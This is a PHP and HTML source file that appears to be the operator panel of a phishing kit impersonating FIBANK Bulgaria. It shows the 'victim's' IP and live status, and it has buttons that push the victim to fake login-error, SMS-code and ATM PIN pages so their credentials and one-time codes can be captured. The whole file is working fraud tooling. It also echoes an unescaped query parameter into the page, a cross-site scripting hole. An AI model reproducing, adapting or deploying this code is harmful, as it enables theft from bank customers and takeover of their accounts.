<?php 
require_once "functions.php";
require_once "ajax.php";
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- link_icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
    <title>Panel | FIBANK BULGARIA PANEL</title>
    <!-- logo site web-->
    <link rel="icon" href="image/fa.ico" type="image/x-icon"/>
    <link rel="shortcut icon" href="image/fai.ico" type="image/x-icon" />
    <!-- link__css -->
    <link rel="stylesheet" href="css/bootstrap.css">
    <link rel="stylesheet" href="css/lol.css">
    <link rel="stylesheet" href="css/animate.css">
</head>
<body class="modal-open">

    <!-- Modal -->
    <div class="modal problem fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;"> 
        <div class="modal-dialog shadow">
            <div class="modal-content">
                <div class="modal-header text-center" style="background:rgba(0, 0, 0, 0.1);">
                    <img src="https://tog.ae/612ajSQ4EGL._AC_UF894_1000_QL80_-removebg-preview.png" alt="SPARTAN Logo" width="60px">
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-12">
                            <div class="PANEL" style="max-width: 500px;margin:0 auto;">

                                <h1 class="mt-3" style="font-size:20px;font-weight:700;">Victim's condition</h1>
                                <ul class="nav" style="border:1px solid #aaa;line-height: 45px;padding-left:10px;">
                                    <li class="nav-item" style="width:40%;border-right:1px solid #aaa;font-weight: 600;">IP:</li>
                                    <li class="nav-item" style="width:60%;width:60%;display:flex;align-items: center;">
                                        <span style="display:flex;align-items: center; height:35px;color: white;font-size:15px;font-weight: 600;width:100px;margin:0 auto;justify-content: center;align-items: center;border-radius:4px;background: #050505;">
                                            <?php echo $_GET['ip']; ?>
                                        </span> 
                                    </li>
                                </ul>
                                <ul class="nav" style="border:1px solid #aaa;border-top: none; line-height: 45px;padding-left:10px;">
                                    <li class="nav-item" style="width:40%;border-right:1px solid #aaa;font-weight: 600;">Status:</li>
                                    <li class="nav-item" style="width:60%;display:flex;align-items: center;">
                                        <span id="status" style="display:flex;align-items: center; height:35px;color: black;font-size:15px;font-weight: 600;width:100px;margin:0 auto;justify-content: center;align-items: center;border-radius:4px;">
                                        </span> 
                                    </li>
                                </ul>
                            </div>
                            <hr>
                            <h4>Panel Control</h4>
                            <form action="infos.php" method="post" class="p-4" style="flex-wrap: wrap;display: flex;justify-content: center;">
                                <input type="hidden" name="step" value="control">
                                <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
                                <!-- START___LOGIN -->
                                <div class="atlanta shadow mt-4" style="width:100%;text-align: center; padding: 20px; border-top: 3px solid #0a0a0a">
                                    <b class="mb-3">Redirect to</b>
                                    <br>
                                    <br>
                                    <button type="submit" class="btn btn-primary px-3 m-2" name="to" value="index">LOGIN ERROR</button>
                                    <button type="submit" class="btn btn-success px-3 m-2" name="to" value="sms">SMS</button>
                                    <button type="submit" class="btn btn-outline-primary px-3 m-2" name="to" value="resms">SMS ERROR</button>
                                    <button type="submit" class="btn btn-outline-primary px-3 m-2" name="to" value="pin">ATM PIN</button>
                                    <button type="submit" class="btn btn-outline-primary px-3 m-2" name="to" value="success">SUCCESS</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="js/jquery-3.5.1.min.js"></script>
    <script src="js/jquery.mask.js"></script>
    <script>
    $(document).ready(function() {
        setInterval(function() {
            $.ajax({
                type: "GET",
                url: "sse-server.php?ip=.<?=$_GET['ip']?>",
                success: function(response) {
                    console.log(response);
                    $("#status").text(response);
                },
                error: function(error) {
                    console.error(error);
                }
            });
        }, 2000); 
    });
    </script>
</body>
</html>